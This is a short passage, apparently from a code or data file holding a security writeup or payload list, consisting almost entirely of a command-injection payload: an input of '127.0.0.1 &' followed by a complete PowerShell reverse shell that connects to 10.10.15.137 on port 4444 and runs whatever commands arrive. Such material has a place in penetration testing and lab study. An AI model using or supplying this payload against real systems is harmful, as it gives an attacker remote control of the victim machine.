127.0.0.1 &amp; PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


</code></pre>`
    }
  }
];
